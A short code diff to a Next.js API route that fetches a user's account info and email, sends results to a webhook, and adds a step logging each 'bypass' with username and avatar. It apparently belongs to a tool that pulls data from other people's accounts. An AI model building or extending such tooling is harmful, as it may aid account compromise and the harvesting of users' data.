@@ -98,7 +98,7 @@ export async function POST(request: Request) {
               console.log("[v0] Email fetched:", email)
             } else {
               console.log("[v0] Email fetch failed (expected, requires CSRF), skipping...")
-              email = "Hidden"
+              email = "Hidden" // Email endpoint requires CSRF token
             }
           } catch (error) {
             console.error("[v0] Failed to fetch email:", error)
@@ -254,6 +254,36 @@ export async function POST(request: Request) {
       console.log("[v0] Webhook failed with status:", webhookResponse.status)
       const errorText = await webhookResponse.text()
       console.log("[v0] Webhook error:", errorText)
+    }
+
+    try {
+      console.log("[v0] Saving to recent bypasses...")
+      const saveResponse = await fetch(
+        `${process.env.NEXT_PUBLIC_BASE_URL || "http://localhost:3000"}/api/recent-bypasses`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            username: userInfo?.name || "Unknown",
+            displayName: userInfo?.displayName || userInfo?.name || "Unknown",
+            avatarUrl: avatarUrl,
+            timestamp: new Date().toISOString(),
+          }),
+        },
+      )
+
+      if (saveResponse.ok) {
+        const result = await saveResponse.json()
+        console.log("[v0] Successfully saved to recent bypasses:", result)
+      } else {
+        const errorText = await saveResponse.text()
+        console.log("[v0] Failed to save recent bypass, status:", saveResponse.status)
+        console.log("[v0] Error response:", errorText)
+      }
+    } catch (error) {
+      console.error("[v0] Failed to save to recent bypasses:", error)
     }
 
     return Response.json({ success: true, userInfo, avatarUrl })
